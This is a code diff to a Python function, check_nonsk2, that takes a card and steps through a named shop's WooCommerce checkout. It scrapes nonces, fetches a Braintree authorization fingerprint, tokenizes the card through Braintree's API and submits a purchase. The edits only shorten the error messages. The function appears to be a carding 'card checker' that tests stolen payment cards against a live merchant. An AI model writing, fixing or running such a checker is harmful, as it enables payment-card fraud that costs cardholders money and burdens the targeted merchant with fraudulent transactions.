@@ -46,7 +46,7 @@ def check_nonsk2(card):
 
             response = r.get("https://reinrespects.com/checkout/")
             if response.status_code != 200:
-                return f"Failed to access checkout page. Status code: {response.status_code}. HTML content: {response.text}"
+                return f"Failed to access checkout page. Status code: {response.status_code}"
 
             checkout_nonce = extract_string(response.text, 'id="woocommerce-process-checkout-nonce" value="', '"')
             wcal_guest_capture_nonce = extract_string(response.text, 'id="wcal_guest_capture_nonce" value="', '"')
@@ -66,7 +66,7 @@ def check_nonsk2(card):
             }
             response = r.post("https://reinrespects.com/wp-admin/admin-ajax.php", data=data, headers=headers)
             if response.status_code != 200:
-                return f"Failed to retrieve client token. Status code: {response.status_code}. HTML content: {response.text}"
+                return f"Failed to retrieve client token. Status code: {response.status_code}"
 
             authorizationFingerprint = json.loads(base64.b64decode(extract_string(response.text, '{"success":true,"data":"', '"'))).get("authorizationFingerprint")
             if not authorizationFingerprint:
@@ -101,7 +101,7 @@ def check_nonsk2(card):
             }
             response = r.post("https://payments.braintree-api.com/graphql", json=data, headers=headers)
             if response.status_code != 200:
-                return f"Failed to tokenize credit card. Status code: {response.status_code}. HTML content: {response.text}"
+                return f"Failed to tokenize credit card. Status code: {response.status_code}"
 
             token = json.loads(response.text).get("data", {}).get("tokenizeCreditCard", {}).get("token")
             if not token:
@@ -132,7 +132,7 @@ def check_nonsk2(card):
             }
             response = r.post("https://reinrespects.com/?wc-ajax=checkout", data=data, headers=headers)
             if response.status_code != 200:
-                return f"Failed to complete the purchase. Status code: {response.status_code}. HTML content: {response.text}"
+                return f"Failed to complete the purchase. Status code: {response.status_code}"
 
             response_data = json.loads(response.text)
 
